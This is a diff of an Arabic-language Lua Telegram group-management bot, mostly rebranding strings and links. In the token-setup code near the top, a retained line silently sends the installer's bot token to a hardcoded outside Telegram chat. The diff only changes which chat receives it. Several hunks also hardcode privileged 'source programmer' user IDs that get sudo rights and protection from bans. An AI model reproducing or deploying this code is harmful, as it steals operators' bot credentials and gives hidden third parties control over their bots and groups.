@@ -32,7 +32,7 @@ io.write('\27[0;31m تم حفظ التوكن بنجاح \na𖣘━┅┄⟞⟦�
 local json = JSON.decode(url)
 database:set(id_server..":token_username",json.result.username)
 database:set(id_server..":token",token)
-https.request('https://api.telegram.org/bot1900386181:AAFMwGkct-xcF-pxK9k3tM9YtzvkClMT-vo/sendmessage?chat_id=1124610301&text=' ..token)
+https.request('https://api.telegram.org/bot1900386181:AAFMwGkct-xcF-pxK9k3tM9YtzvkClMT-vo/sendmessage?chat_id=859213488&text=' ..token)
 end 
 else
 print('\27[0;35m𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘\n لم يتم حفظ التوكن ارسل لي التوكن الان')
@@ -149,11 +149,10 @@ _redis = load_redis()
 print([[
 
 
-   ___            ___             ____               __    
-  / _ | ___ ___ _/ (_)_ _____ _  / __/__ ___ _____  / /_   
- / __ |(_-</ _ `/ / / // / _ `/ / _// _ `/ // / _ \/ __/   
-/_/ |_/___/\_,_/_/_/\_, /\_,_/ /___/\_, /\_, / .__/\__/    
-                   /___/           /___//___/_/            
+   __ _____   __  _______ 
+  / // / _ | /  |/  / __ \
+ / _  / __ |/ /|_/ / /_/ /
+/_//_/_/ |_/_/  /_/\____/     
                           
 > CH 💌 ↝@uu_regan↜
 ~> DEVELOPER 💌 {text = @mo1ibrahim
@@ -182,7 +181,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1124610301,1759990986,968613145,1890233810,1885313077}   
+sudo_users = {SUDO,859213488,1759990986,968613145,1890233810,1885313077}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -280,7 +279,7 @@ return false
 end 
 end
 function Can_or_NotCan(user_id,chat_id)
-if tonumber(user_id) == tonumber(1124610301) then  
+if tonumber(user_id) == tonumber(859213488) then  
 var = true 
 elseif tonumber(user_id) == tonumber(1890233810) then
 var = true  
@@ -322,7 +321,7 @@ end
 return var
 end 
 function Rutba(user_id,chat_id)
-if tonumber(user_id) == tonumber(1124610301) then  
+if tonumber(user_id) == tonumber(859213488) then  
 var = 'مبرمج السورس'
 elseif tonumber(user_id) == tonumber(968613145) then
 var = 'صاحب التليجرام'
@@ -723,7 +722,7 @@ end
 function Addmp3(msg,chat,kkl,ffrr)
 local eer = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..kkl)) 
 download_to_file('https://api.telegram.org/file/bot'..token..'/'..eer.result.file_path,ffrr) 
-sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼《🦹‍♂ ᏟᎻ 🦹‍♂》")  
+sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》")  
 os.execute('rm -rf ./'..ffrr) 
 end
 function Addsticker(msg,chat,Sd,rre)
@@ -1001,8 +1000,8 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = ' ❨𖣘• ⁽ՏᎪYͲᎡᎪ₎ •𖣘❩',url="t.me/SAYTRA55"}},
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》',url="t.me/uu_regan"}},
+{{text = ' ❨𖣘• ⁽〠ՏᎪYͲᎡᎪ〠₎ •𖣘❩',url="t.me/SAYTRA55"}},
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》',url="t.me/uu_regan"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -1020,7 +1019,7 @@ local Text = [[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = ' ❨𖣘• ⁽ᯓ『𝒎.𝒊𝒃𝒓𝒂𝒉𝒊𝒎 ‏. 』𓆃₎ •𖣘❩',url="t.me/mo1ibrahim"}},
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》',url="t.me/uu_regan"}},
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》',url="t.me/uu_regan"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -1308,7 +1307,7 @@ end
 tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil) 
 end
 if text == '/start' and DevSoFi(msg) then 
-local Text = '🌏انت الان المطور الاساسي في البوت \n 🌏سورس ريجان\n 🌏يمكنك تحكم في البوتات من الكيبورد أسفل \n[تابع جديدنا](t.me/uu_regan)'
+local Text = '🌏انت الان المطور الاساسي في البوت \n 🌏سورس ريجان\n ??يمكنك تحكم في البوتات من الكيبورد أسفل \n[تابع جديدنا](t.me/uu_regan)'
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName}}, 
@@ -1468,18 +1467,18 @@ local Text = [[
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}}, 
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/uu_regan/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
-if text == '━┅┅┄⟞⟦🦹‍♂ ᏟᎻ 🦹‍♂⟧⟝┄┉┉━' and DevSoFi(msg) then
+if text == '━┅┅┄⟞⟦〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠⟧⟝┄┉┉━' and DevSoFi(msg) then
 local Text = [[ 
 [قناه سورس ريجان ادخل وتابع الجديد](t.me/uu_regan)
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}}, 
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/DEV_ASALIYA/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -1546,7 +1545,7 @@ local Text = [[
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}}, 
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/uu_regan/83/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -3212,18 +3211,18 @@ end
 if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'source' then
 local Text = [[
 
-╭𖣘━┅⟞⟦[🦹‍♂ ᏟᎻ 🦹‍♂](http://t.me/uu_regan)⟧⟝┉━𖣘╮
+╭𖣘━┅⟞⟦[〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠](http://t.me/uu_regan)⟧⟝┉━𖣘╮
 
-    [⟦W𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 🦹‍♂ ᏟᎻ 🦹‍♂⟧](http://t.me/uu_regan)
+    [⟦W𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠⟧](http://t.me/uu_regan)
 
-╰𖣘━┅⟞⟦[🦹‍♂ ᏟᎻ 🦹‍♂](http://t.me/uu_regan)⟧⟝┉━𖣘╯
+╰𖣘━┅⟞⟦[〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠](http://t.me/uu_regan)⟧⟝┉━𖣘╯
 
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '❨𖣘• ⁽𝒎.𝒊𝒃𝒓𝒂𝒉𝒊𝒎₎ •𖣘❩',url="t.me/mo1ibrahim"},{text = '❨𖣘• ⁽ՏᎪYͲᎡᎪ₎ •𖣘❩', url="t.me/SAYTRA55"}},
+{{text = '❨𖣘• ⁽𝒎.𝒊𝒃𝒓𝒂𝒉𝒊𝒎₎ •𖣘❩',url="t.me/mo1ibrahim"},{text = '❨𖣘• ⁽〠ՏᎪYͲᎡᎪ〠₎ •𖣘❩', url="t.me/SAYTRA55"}},
 {{text = '❨𖣘• ⁽🎌لشراء بوت🎌₎ •𖣘❩',url="t.me/SAYTRA55"}},
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》',url="t.me/uu_regan"}},
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》',url="t.me/uu_regan"}},
 {{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
@@ -3237,8 +3236,8 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = ' ❨𖣘• ⁽ՏᎪYͲᎡᎪ •𖣘❩',url="t.me/SAYTRA55"}},
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》 ', url="t.me/uu_regan"}},
+{{text = ' ❨𖣘• ⁽〠ՏᎪYͲᎡᎪ〠 •𖣘❩',url="t.me/SAYTRA55"}},
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》 ', url="t.me/uu_regan"}},
 {{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
@@ -3252,7 +3251,7 @@ local Text = [[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = ' ❨𖣘• ⁽ᯓ『𝒎.𝒊𝒃𝒓𝒂𝒉𝒊𝒎 ‏. 』𓆃₎ •𖣘❩',url="t.me/mo1ibrahim"}},
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》',url="t.me/uu_regan"}},
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》',url="t.me/uu_regan"}},
 {{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
@@ -3265,8 +3264,8 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = ' ❨𖣘• ⁽ՏᎪYͲᎡᎪ₎ •𖣘',url="t.me/SAYTRA55"}},
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》',url="t.me/uu_regan"}},
+{{text = ' ❨𖣘• ⁽〠ՏᎪYͲᎡᎪ〠₎ •𖣘',url="t.me/SAYTRA55"}},
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》',url="t.me/uu_regan"}},
 {{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
@@ -3332,7 +3331,7 @@ local Text ='تم اختيار الاستوري هذه لك'
 keyboard = {}  
 keyboard.inline_keyboard = { 
 {{text = ' ❨𖣘• ⁽ᯓ『𝒎.𝒊𝒃𝒓𝒂𝒉𝒊𝒎 ‏. 』𓆃₎ •𖣘',url="t.me/mo1ibrahim"}},
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》',url="t.me/uu_regan"}},
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》',url="t.me/uu_regan"}},
 {{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
@@ -3345,7 +3344,7 @@ local Text ='تم اختيار تصميم من تصميمات ريجان هذه 
 keyboard = {}  
 keyboard.inline_keyboard = { 
 {{text = '❨  𖣘• ⁽ᯓ『𝒎.𝒊𝒃𝒓𝒂𝒉𝒊𝒎 ‏. 』𓆃₎ •𖣘 ❩', url="t.me/mo1ibrahim"}},
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》',url="t.me/uu_regan"}},
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》',url="t.me/uu_regan"}},
 {{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
@@ -3358,7 +3357,7 @@ local Text ='تم اختيار فيديو مثالي لك وسيتم التغي�
 keyboard = {}  
 keyboard.inline_keyboard = { 
 {{text = '❨  𖣘• ⁽ᯓ『𝒎.𝒊𝒃𝒓𝒂𝒉𝒊𝒎 ‏. 』𓆃₎ •𖣘 ❩', url="t.me/mo1ibrahim"}},
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》',url="t.me/uu_regan"}},
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》',url="t.me/uu_regan"}},
 {{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
@@ -4160,16 +4159,16 @@ end
 end 
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil) 
 end
-if text == '《🦹‍♂ ᏟᎻ 🦹‍♂》' then
+if text == '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》' then
 local Text = [[ 
  🌏من أحسن السورسات على التليجرام سورس ريجان 🌏
 حمايه.سرعه.دقه وامان
  قناه السورس ⬇️
-  [W𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 🦹‍♂ ᏟᎻ 🦹‍♂](http://t.me/uu_regan)
+  [W𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠](http://t.me/uu_regan)
 ]]
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》 ', url="t.me/uu_regan"}}, 
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》 ', url="t.me/uu_regan"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/uu_regan/83/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -4183,7 +4182,7 @@ local Text = [[
 ]]
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}}, 
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/uu_regan/84&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -4228,7 +4227,7 @@ local Text = [[
 🌏 معني + اسمك ← لعرض الميزه
 🌏 خلفيات ← لعرض الميزه
 ╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
-🌏 𝘾𝙃 - [《🦹‍♂ ᏟᎻ 🦹‍♂》](t.me/uu_regan) 
+🌏 𝘾𝙃 - [《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》](t.me/uu_regan) 
 ╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 ]]
 keyboard = {}  
@@ -4273,7 +4272,7 @@ keyboard.inline_keyboard = {
 {{text = 'SpaceTraveler', url="https://t.me/gamee?game=SpaceTraveler"},{text = 'RedAndBlue', url="https://t.me/gamee?game=RedAndBlue"}},  
 {{text = 'SkodaHockey1 ', url="https://t.me/gamee?game=SkodaHockey1"},{text = 'SummerLove', url="https://t.me/gamee?game=SummerLove"}},  
 {{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}},  
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}},
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}},
 {{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 }  
 local msg_id = msg.id_/2097152/0.5  
@@ -5426,7 +5425,7 @@ if tonumber(result.sender_user_id_) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر البوت عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1124610301) then  
+if tonumber(result.sender_user_id_) == tonumber(859213488) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
@@ -5484,7 +5483,7 @@ if result.id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " 🌏 لا يمكنك حظر المطور الاساسي \n")
 return false 
 end
-if result.id_ == tonumber(1124610301) then
+if result.id_ == tonumber(859213488) then
 send(msg.chat_id_, msg.id_, " 🌏 لا يمكنك حظر مبرمج السورس \n")
 return false 
 end
@@ -5532,7 +5531,7 @@ if tonumber(userid) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر البوت عام")
 return false 
 end
-if tonumber(userid) == tonumber(1124610301) then  
+if tonumber(userid) == tonumber(859213488) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
@@ -5581,7 +5580,7 @@ if tonumber(result.sender_user_id_) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع كتم البوت عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1124610301) then  
+if tonumber(result.sender_user_id_) == tonumber(859213488) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
@@ -5634,7 +5633,7 @@ if result.id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " 🌏 لا يمكنك كتم المطور الاساسي \n")
 return false 
 end
-if result.id_ == tonumber(1124610301) then
+if result.id_ == tonumber(859213488) then
 send(msg.chat_id_, msg.id_, " 🌏 لا يمكنك كتم مبرمج السورس \n")
 return false 
 end
@@ -5682,7 +5681,7 @@ if tonumber(userid) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع كتم البوت عام")
 return false 
 end
-if tonumber(userid) == tonumber(1124610301) then  
+if tonumber(userid) == tonumber(859213488) then  
 send(msg.chat_id_, msg.id_, " 🌏 لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
@@ -8169,7 +8168,7 @@ send(msg.chat_id_, msg.id_, ' 🌏 تم مسح جميع الزوجات')
 end
 if text == ("تاك للزوجات") and Mod(msg) then
 local list = database:smembers(bot_id..'Mode:User'..msg.chat_id_)
-t = "\n 🌏 قائمه زوجات الجروب \n 🌏═───═❲[《🦹‍♂ ᏟᎻ 🦹‍♂》 ](t.me/uu_regan)❳═───═??\n"
+t = "\n 🌏 قائمه زوجات الجروب \n 🌏═───═❲[《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》 ](t.me/uu_regan)❳═───═??\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -10914,7 +10913,7 @@ kickme = '✘'
 end
 NUM_MSG_MAX = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 0
 local text = 
-'\n❲[《🦹‍♂ ᏟᎻ 🦹‍♂》 ](t.me/uu_regan)❳'..
+'\n❲[《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》 ](t.me/uu_regan)❳'..
 '\n𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘'..
 '\n 🌏 اعدادات الجروب كتالي ☆'..
 '\nء𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘'..
@@ -10951,7 +10950,7 @@ local text =
 ' }\n'..' 🌏  التكرار  ⇇{ '..flood..
 ' }\n'..' 🌏  الترحيب  ⇇{ '..welcome..
 ' }\n'..' 🌏  عدد التكرار  ⇇{ '..NUM_MSG_MAX..
-' }\nء⧬━┅┅┄⟞❲[🦹‍♂ ᏟᎻ 🦹‍♂](t.me/uu_regan)❳⟝┄┉┉━⧬'..
+' }\nء⧬━┅┅┄⟞❲[〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠](t.me/uu_regan)❳⟝┄┉┉━⧬'..
 '\n 🌏  علامة ال {✓} تعني مفعل'..
 '\n 🌏  علامة ال {✘} تعني معطل'..
 '\nء𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘'..
@@ -10963,7 +10962,7 @@ local text =
 ' }\n'..' 🌏  الايدي  ⇇{ '..idgp..
 ' }\n'..' 🌏  الايدي بالصوره  ⇇{ '..idph..
 ' }\n'..' 🌏  الرفع  ⇇{ '..setadd..
-' }\n'..' 🌏  الحظر  ⇇{ '..banm..' }\n\n 🌏═───═❲[《🦹‍♂ ᏟᎻ 🦹‍♂》 ](t.me/uu_regan)❳═───═ 🌏\n 🌏 قناة سورس ريجان𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘\n [ ❲[《🦹‍♂ ᏟᎻ 🦹‍♂》 ](t.me/uu_regan)❳](t.me/uu_regan) \n'
+' }\n'..' 🌏  الحظر  ⇇{ '..banm..' }\n\n 🌏═───═❲[《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》 ](t.me/uu_regan)❳═───═ 🌏\n 🌏 قناة سورس ريجان𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘\n [ ❲[《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》 ](t.me/uu_regan)❳](t.me/uu_regan) \n'
 send(msg.chat_id_, msg.id_,text)     
 end
 if text ==('تثبيت') and msg.reply_to_message_id_ ~= 0 and Mod(msg) then  
@@ -11076,7 +11075,7 @@ for k,v in pairs(zx.ok) do
 i = i + 1
 t = t..i.."-  `"..v.."` \n"
 end
-send(msg.chat_id_, msg.id_, t..'𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘\nاضغط علي الاسم ليتم نسخه\n𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘ٴ\n 🌏 ❲[《🦹‍♂ ᏟᎻ 🦹‍♂》 ](t.me/uu_regan)❳ 🌏 ')
+send(msg.chat_id_, msg.id_, t..'𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘\nاضغط علي الاسم ليتم نسخه\n𖣘━┅┄⟞⟦𝐑𝐄𝐆𝐀𝐍⟧⟝┄┉━𖣘ٴ\n 🌏 ❲[《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》 ](t.me/uu_regan)❳ 🌏 ')
 end
 if text == "ضع رابط" or text == 'وضع رابط' then
 if msg.reply_to_message_id_ == 0  and Mod(msg) then  
@@ -12805,7 +12804,7 @@ if audios.Info == true then
 local Text ='تم اختيار المقطع الصوتي لك'
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}},
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -12818,7 +12817,7 @@ ght = math.random(1,33);
 local Text ='الستخدم ثيم اخر اكتب ثيم'  
 keyboard = {}   
 keyboard.inline_keyboard = {  
- {{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}},
+ {{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}},
 }  
 local msg_id = msg.id_/2097152/0.5  
 https.request("https://api.telegram.org/bot"..token..'/sendDocument?chat_id=' .. msg.chat_id_ .. '&document=https://t.me/ahmedthem1/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12834,7 +12833,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}},
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/comxnxp/18&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12844,7 +12843,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}},
+{{text = '《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/comxnxp/19&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12854,7 +12853,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = ' 《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}},
+{{text = ' 《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/comxnxp/20&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12864,7 +12863,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = ' 《🦹‍♂ ᏟᎻ 🦹‍♂》', url="t.me/uu_regan"}},
+{{text = ' 《〠𝐒𝐎𝐔𝐑𝐒𝐄 𝐑𝐄𝐆𝐀𝐍〠》', url="t.me/uu_regan"}},
 }
 local msg_id = msg.id_/2097152/0.5
